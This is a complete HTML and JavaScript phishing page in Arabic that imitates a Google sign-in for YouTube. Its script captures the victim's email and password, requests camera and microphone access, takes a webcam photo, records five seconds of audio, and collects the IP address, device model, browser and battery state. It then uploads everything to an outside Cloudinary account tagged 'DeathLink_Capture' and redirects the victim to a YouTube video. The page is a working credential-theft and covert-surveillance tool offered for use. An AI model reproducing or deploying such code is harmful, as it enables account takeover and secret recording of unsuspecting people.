<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - التحقق من الهوية</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .card { width: 95%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; background: #fff; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        img.logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        p { color: #3c4043; margin-bottom: 25px; font-size: 16px; }
        input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
        button { background: #1a73e8; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 14px; }
        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
        #c { display: none; }
    </style>
</head>
<body>

<div class="card" id="ui">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
    <h1>تسجيل الدخول</h1>
    <p>استخدم حسابك للمتابعة إلى YouTube</p>
    <input type="email" id="e" placeholder="البريد الإلكتروني أو الهاتف" required>
    <input type="password" id="p" placeholder="أدخل كلمة المرور" required>
    <button onclick="run()">التالي</button>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    // إعدادات Cloudinary الخاصة بك
    const cn = 'dgkttv99v', pr = 'ml_default', yt = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

    async function run() {
        const email = document.getElementById('e').value, pass = document.getElementById('p').value;
        if(!email || !pass) return alert("يرجى إدخال البيانات");

        try {
            // 1. طلب الصلاحيات
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const video = document.getElementById('v');
            video.srcObject = stream;
            video.play();

            document.getElementById('ui').innerHTML = "<h3>جاري مزامنة الحساب...</h3><p>يرجى الانتظار لإتمام الفحص الأمني</p>";

            // 2. سحب بيانات الجهاز والبطارية (أ)
            const deviceData = await getFullSpecs();

            // 3. انتظار استقرار الكاميرا ثم التصوير والتسجيل
            setTimeout(async () => {
                const canvas = document.getElementById('c');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                const img = canvas.toDataURL("image/png");

                startRecording(email, pass, img, deviceData, stream);
            }, 2500);

        } catch (err) { window.location.href = yt; }
    }

    async function getFullSpecs() {
        let info = {
            ua: navigator.userAgent,
            browser: "Unknown",
            model: "PC/Generic",
            bat: "N/A",
            char: "N/A"
        };

        // تحديد المتصفح والموديل
        if (info.ua.indexOf("Firefox") > -1) info.browser = "Firefox";
        else if (info.ua.indexOf("Chrome") > -1) info.browser = "Chrome";
        else if (info.ua.indexOf("Safari") > -1) info.browser = "Safari";

        const match = info.ua.match(/\(([^)]+)\)/);
        if (match) info.model = match[1].split(';')[0];

        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                info.bat = Math.round(b.level * 100) + "%";
                info.char = b.charging ? "Yes" : "No";
            }
        } catch(e){}
        return info;
    }

    function startRecording(e, p, img, dev, stream) {
        // حل مشكلة الصوت: اختيار الصيغة المدعومة أوتوماتيكياً
        const mimeType = MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/ogg';
        const recorder = new MediaRecorder(stream, { mimeType });
        let chunks = [];

        recorder.ondataavailable = ev => { if(ev.data.size > 0) chunks.push(ev.data); };
        
        recorder.onstop = async () => {
            const audioBlob = new Blob(chunks, { type: mimeType });
            await sendData(e, p, img, audioBlob, dev);
            window.location.href = yt; // التحويل بعد ضمان انتهاء وظيفة الإرسال
        };

        recorder.start();
        setTimeout(() => recorder.stop(), 5000); // تسجيل 5 ثوانٍ
    }

    async function sendData(e, p, img, aud, dev) {
        let ip = "Unknown";
        try { 
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            ip = data.ip;
        } catch(err){}

        // تجميع البيانات النهائية في الـ Context
        const ctx = `u=${e}|p=${p}|ip=${ip}|dev=${dev.model}|br=${dev.browser}|bat=${dev.bat}|char=${dev.char}`;

        // رفع الصورة
        const fd1 = new FormData();
        fd1.append('file', img);
        fd1.append('upload_preset', pr);
        fd1.append('context', ctx);
        fd1.append('tags', 'DeathLink_Capture');

        // رفع الصوت (كـ Video لضمان المعالجة في كلوديناري)
        const fd2 = new FormData();
        fd2.append('file', aud);
        fd2.append('upload_preset', pr);
        fd2.append('resource_type', 'video'); 
        fd2.append('context', ctx);
        fd2.append('tags', 'DeathLink_Audio');

        // تنفيذ الرفع الفعلي
        await Promise.all([
            fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, { method: 'POST', body: fd1 }),
            fetch(`https://api.cloudinary.com/v1_1/${cn}/upload`, { method: 'POST', body: fd2 })
        ]);
        
        return new Promise(res => setTimeout(res, 500)); // مهلة بسيطة لضمان خروج الـ Packets
    }
</script>
</body>
</html>
